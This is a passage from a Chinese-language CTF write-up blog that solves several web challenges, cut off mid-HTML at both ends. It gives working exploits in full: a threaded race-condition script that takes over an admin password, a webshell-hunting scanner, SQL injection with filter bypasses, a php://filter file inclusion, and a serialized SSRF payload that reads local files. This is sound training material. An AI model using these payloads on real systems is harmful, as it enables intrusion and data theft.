class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exp.py</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">login</span><span class=\"params\">(s, username, password)</span>:</span></span><br><span class=\"line\">    data = &#123;</span><br><span class=\"line\">        <span class=\"string\">'username'</span>: username,</span><br><span class=\"line\">        <span class=\"string\">'password'</span>: password,</span><br><span class=\"line\">        <span class=\"string\">'submit'</span>: <span class=\"string\">''</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s.post(<span class=\"string\">\"http://admin.2018.hctf.io/login\"</span>, data=data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">logout</span><span class=\"params\">(s)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> s.get(<span class=\"string\">\"http://admin.2018.hctf.io/logout\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">(s, newpassword)</span>:</span></span><br><span class=\"line\">    data = &#123;</span><br><span class=\"line\">        <span class=\"string\">'newpassword'</span>:newpassword</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s.post(<span class=\"string\">\"http://admin.2018.hctf.io/change\"</span>, data=data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func1</span><span class=\"params\">(s)</span>:</span></span><br><span class=\"line\">    login(s, <span class=\"string\">'skysec'</span>, <span class=\"string\">'skysec'</span>)</span><br><span class=\"line\">    change(s, <span class=\"string\">'skysec'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func2</span><span class=\"params\">(s)</span>:</span></span><br><span class=\"line\">    logout(s)</span><br><span class=\"line\">    res = login(s, <span class=\"string\">'admin'</span>, <span class=\"string\">'skysec'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">'&lt;a href=\"/index\"&gt;/index&lt;/a&gt;'</span> <span class=\"keyword\">in</span> res.text:</span><br><span class=\"line\">        print(<span class=\"string\">'finish'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1000</span>):</span><br><span class=\"line\">        print(i)</span><br><span class=\"line\">        s = requests.Session()</span><br><span class=\"line\">        t1 = threading.Thread(target=func1, args=(s,))</span><br><span class=\"line\">        t2 = threading.Thread(target=func2, args=(s,))</span><br><span class=\"line\">        t1.start()</span><br><span class=\"line\">        t2.start()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"hide-and-seak\"><a href=\"#hide-and-seak\" class=\"headerlink\" title=\"hide_and_seak\"></a>hide_and_seak</h3><p><strong>zip软连接读取文件</strong></p>\n<p>Linux ln命令是一个非常重要命令，它的功能是为某一个文件在另外一个位置建立一个同步的链接。   当我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在某个固定的目录，放上该文件，然后在 其它的目录下用ln命令链接（link）它就可以，不必重复的占用磁盘空间。</p>\n<p>Linux文件系统中，有所谓的链接(link)，我们可以将其视为档案的别名，而链接又可分为两种 : 硬链接(hard link)与软链接(symbolic link)，硬链接的意思是一个档案可以有多个名称，而软链接的方式则是产生一个特殊的档案，该档案的内容是指向另一个档案的位置。硬链接是存在同一个文件系统中，而软链接却可以跨越不同的文件系统。</p>\n<p>软链接：</p>\n<pre><code>1.软链接，以路径的形式存在。类似于Windows操作系统中的快捷方式\n2.软链接可以 跨文件系统 ，硬链接不可以\n3.软链接可以对一个不存在的文件名进行链接\n4.软链接可以对目录进行链接</code></pre><p>硬链接：</p>\n<pre><code>1.硬链接，以文件副本的形式存在。但不占用实际空间。\n2.不允许给目录创建硬链接\n3.硬链接只有在同一个文件系统中才能创建</code></pre><p>我们尝试生成一个软连接</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/tmp# ln -s test.txt test</span><br><span class=\"line\">\t  ll</span><br><span class=\"line\">lrwxrwxrwx  1 root  root 8 11月  7 17:41 test -&gt; test.txt</span><br><span class=\"line\">-rw-r--r--  1 root  root12 11月  7 17:41 test.txt</span><br><span class=\"line\"></span><br><span class=\"line\">/tmp# cat test</span><br><span class=\"line\">hello world</span><br><span class=\"line\"></span><br><span class=\"line\">/tmp# cat test.txt</span><br><span class=\"line\">hello world</span><br></pre></td></tr></table></figure>\n\n<p>尝试读取文件内容：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -r \"echo file_get_contents('test.txt');\"</span><br><span class=\"line\">hello world</span><br><span class=\"line\"></span><br><span class=\"line\">php -r \"echo file_get_contents('test');\"</span><br><span class=\"line\">hello world</span><br></pre></td></tr></table></figure>\n\n<p>然后我们尝试进行压缩 –symlinks 即生成软连接</p>\n<pre><code>zip --symlinks test.zip test</code></pre><h3 id=\"强网杯-高明的黑客\"><a href=\"#强网杯-高明的黑客\" class=\"headerlink\" title=\"强网杯-高明的黑客\"></a>强网杯-高明的黑客</h3><p>打开之后提示我们下载源码，下载完发现是一个有 3002 个php文件的文件夹。</p>\n<p>查看文件内容后发现代码难以阅读，做了很多混淆，但是里面充满了 <code>$_GET &amp; $_POST</code> 以及 <code>eval、exec、assert...</code> 可以看出来这应该藏了一个shell，我们要做的就是把可用的 shell 找出来</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> multiprocessing.dummy <span class=\"keyword\">import</span> Pool <span class=\"keyword\">as</span> ThreadPool</span><br><span class=\"line\"><span class=\"keyword\">from</span> datetime <span class=\"keyword\">import</span> datetime</span><br><span class=\"line\"></span><br><span class=\"line\">target_path = []</span><br><span class=\"line\">path = <span class=\"string\">\"F:\\CTF-files\\BUUCTF\\WEB\\高明的黑客\\www\\src\"</span></span><br><span class=\"line\">count = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> filename <span class=\"keyword\">in</span> os.listdir(path):</span><br><span class=\"line\">    <span class=\"comment\"># print(os.path.join(path, filename))</span></span><br><span class=\"line\">    target_path.append(filename)</span><br><span class=\"line\">    <span class=\"comment\"># count += 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(target_path)</span></span><br><span class=\"line\"><span class=\"comment\"># print(count)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(target)</span>:</span></span><br><span class=\"line\">    <span class=\"comment\"># params = &#123;&#125;</span></span><br><span class=\"line\">    result = []</span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(<span class=\"string\">\"F:\\CTF-files\\BUUCTF\\WEB\\高明的黑客\\www\\src\\\\\"</span>+ target, <span class=\"string\">\"r\"</span>, encoding=<span class=\"string\">\"utf-8\"</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        text = f.read()</span><br><span class=\"line\">        Get = list(re.findall(<span class=\"string\">'\\$_GET\\[\\'(.*?)\\'\\]'</span>, text))  <span class=\"comment\"># 得到当前文件内所有的 GET 参数</span></span><br><span class=\"line\">        <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">        for param in Get:</span></span><br><span class=\"line\"><span class=\"string\">            params[param] = 'echo(\"2333\");'  # 将正则到的所有参数都加上参数</span></span><br><span class=\"line\"><span class=\"string\">        # print(params)</span></span><br><span class=\"line\"><span class=\"string\">        \"\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> Get:</span><br><span class=\"line\">            url = <span class=\"string\">\"http://127.0.0.1/buu/src/\"</span></span><br><span class=\"line\">            new_url = <span class=\"string\">\"%s%s?%s=%s\"</span> % (url, target_path, i, <span class=\"string\">'echo \"2333\"'</span>)</span><br><span class=\"line\">            r = requests.get(new_url)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"2333\"</span> <span class=\"keyword\">in</span> r.text:  <span class=\"comment\"># 带参数访问后检查是否有参数输出</span></span><br><span class=\"line\">                print(<span class=\"string\">\"++++++++++++++++++++++++++++GET find it! in \"</span> + target_path)</span><br><span class=\"line\">                result.append(target_path)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                print(<span class=\"string\">\"GET No ! in \"</span> + target_path + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">                print(r.url + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">            r.close()</span><br><span class=\"line\">    print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">post</span><span class=\"params\">(target_path)</span>:</span></span><br><span class=\"line\">    data = &#123;&#125;</span><br><span class=\"line\">    result = []</span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(<span class=\"string\">\"F:\\CTF-files\\BUUCTF\\WEB\\高明的黑客\\www\\src\\\\\"</span> + target_path, <span class=\"string\">\"r\"</span>, encoding=<span class=\"string\">\"utf-8\"</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        text = f.read()</span><br><span class=\"line\">        Get = list(re.findall(<span class=\"string\">'\\$_GET\\[\\'(.*?)\\'\\]'</span>, text))  <span class=\"comment\"># 得到当前文件内所有的 GET 参数</span></span><br><span class=\"line\">        <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">        for param in Get:</span></span><br><span class=\"line\"><span class=\"string\">            data[param] = 'print_r(\"2333\")'  # 将正则到的所有参数都加上参数</span></span><br><span class=\"line\"><span class=\"string\">        # print(params)</span></span><br><span class=\"line\"><span class=\"string\">        \"\"\"</span></span><br><span class=\"line\">        url = <span class=\"string\">\"http://127.0.0.1/buu/src/\"</span></span><br><span class=\"line\">        r = requests.post(url + target_path, data=data)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"2333\"</span> <span class=\"keyword\">in</span> r.text:  <span class=\"comment\"># 带参数访问后检查是否有参数输出</span></span><br><span class=\"line\">            print(<span class=\"string\">\"++++++++++++++++++++++++++++POST find it! in \"</span> + target_path)</span><br><span class=\"line\">            result.append(target_path)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"POST No ! in \"</span> + target_path + <span class=\"string\">\"\\r\\n\"</span>)</span><br><span class=\"line\">        r.close()</span><br><span class=\"line\">    print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">t1 = datetime.now()</span><br><span class=\"line\"></span><br><span class=\"line\">pool = ThreadPool(processes=<span class=\"number\">20</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> target_path:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        results = pool.apply_async(get, i)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        print(e)</span><br><span class=\"line\">pool.close()</span><br><span class=\"line\">pool.join()</span><br><span class=\"line\"></span><br><span class=\"line\">print(<span class=\"string\">'Multiprocess Scanning Completed in  '</span>, datetime.now() - t1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    get(target_path)</span><br><span class=\"line\">    post(target_path)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p>提取完所有的 <code>GET和POST</code> 参数之后放在本地访问，如果我们加的参数成功 <code>echo</code> 了，说明找到可用 shell ，随后 <code>cat /flag</code> 即可。</p>\n<h3 id=\"EasySQL\"><a href=\"#EasySQL\" class=\"headerlink\" title=\"EasySQL\"></a>EasySQL</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&apos; 123</span><br><span class=\"line\">to use near &apos;123&apos;&apos; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">1&apos; or 1=1   123</span><br><span class=\"line\">use near &apos; &apos; and password=&apos;123&apos; &apos; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">1&apos; or 1=1# 123</span><br></pre></td></tr></table></figure>\n\n<p>登陆就有flag.</p>\n<h3 id=\"Havefun\"><a href=\"#Havefun\" class=\"headerlink\" title=\"Havefun\"></a>Havefun</h3><p>查看源码发现</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$cat=$_GET[<span class=\"string\">'cat'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $cat;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($cat==<span class=\"string\">'dog'</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>GET</code>传参</p>\n<h3 id=\"Secret-File\"><a href=\"#Secret-File\" class=\"headerlink\" title=\"Secret File\"></a>Secret File</h3><p><strong>F12</strong>打开开发者工具，监视网络，发现在连续的三个页面中间有一个302跳转，我们抓包之后发现跳转页面的注释中给了一个文件名 <code>secr3t.php</code> ,访问得到代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class=\"line\">    &lt;meta charset=<span class=\"string\">\"UTF-8\"</span>&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">    $file=$_GET[<span class=\"string\">'file'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(strstr($file,<span class=\"string\">\"../\"</span>)||stristr($file, <span class=\"string\">\"tp\"</span>)||stristr($file,<span class=\"string\">\"input\"</span>)||stristr($file,<span class=\"string\">\"data\"</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Oh no!\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">include</span>($file); </span><br><span class=\"line\"><span class=\"comment\">//flag放在了flag.php里</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>php 伪协议读文件之后再解码即可：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php:<span class=\"comment\">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"网鼎杯-Fakebook\"><a href=\"#网鼎杯-Fakebook\" class=\"headerlink\" title=\"网鼎杯-Fakebook\"></a>网鼎杯-Fakebook</h3><p>扫目录得到 robots.txt </p>\n<p><code>/user.php.bak</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">UserInfo</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $name = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $blog = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($name, $age, $blog)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;name = $name;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;age = (int)$age;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;blog = $blog;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get</span><span class=\"params\">($url)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $ch = curl_init();</span><br><span class=\"line\"></span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</span><br><span class=\"line\">        $output = curl_exec($ch);</span><br><span class=\"line\">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($httpCode == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">404</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        curl_close($ch);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $output;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getBlogContents</span> <span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;get(<span class=\"keyword\">$this</span>-&gt;blog);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isValidBlog</span> <span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $blog = <span class=\"keyword\">$this</span>-&gt;blog;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> preg_match(<span class=\"string\">\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\"</span>, $blog);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>看起来像 SSRF ，又有序列化。</p>\n<h4 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h4><p><code>Join</code> 页面 <code>sqlmap</code> 试出来 <code>username</code> 有 POST 注入，存的数据是序列化之后的用户信息。</p>\n<p>注册登录之后查看 BLOG 内容页面发现 <code>no</code> 参数可能存在注入：</p>\n<p><code>http://buuoj.cn/view.php?no=1 and 1=1#</code></p>\n<p><code>正常</code></p>\n<p><code>node3.buuoj.cn/view.php?no=1 and 1=2#</code></p>\n<p><code>报错 Notice: Trying to get property of non-object in /var/www/html/view.php on line 53</code></p>\n<p><code>node3.buuoj.cn/view.php?no=1 order by 5#</code></p>\n<p><code>*] query error! (Unknown column &#39;5&#39; in &#39;order clause&#39;)</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1 union select 1,2,3,4#</code></p>\n<p><code>有过滤：no hack ~_~</code></p>\n<p><code>.node3.buuoj.cn/view.php?no=-1 union/**/select 1,2,3,4#</code></p>\n<p><code>找到回显位在 2</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(schema_name),3,4 from information_schema.schemata--+</code></p>\n<p><code>fakebook,information_schema,mysql,performance_schema,test</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#39;fakebook&#39;--+</code></p>\n<p><code>users</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;--+</code></p>\n<p><code>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(data,username,passwd),3,4 from users--+</code></p>\n<p><code>O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;goya&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:20:&quot;http://www.baidu.com&quot;;}goyaed12c3322e527f073f9159f257dfcc7db08c86ec11388c76b6c5009b06aa33ecd6bfab7d74151ba3f0c50ef1938c03134762c9e435cc88db39c53114ed2a2b14</code></p>\n<p>序列化存储 <code>data</code></p>\n<p>结合上面的代码我们可以知道下面的代码即可读取 flag ：</p>\n<p><code>?no=0 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39;</code></p>\n<p>顺便读一下 <code>view.php</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span 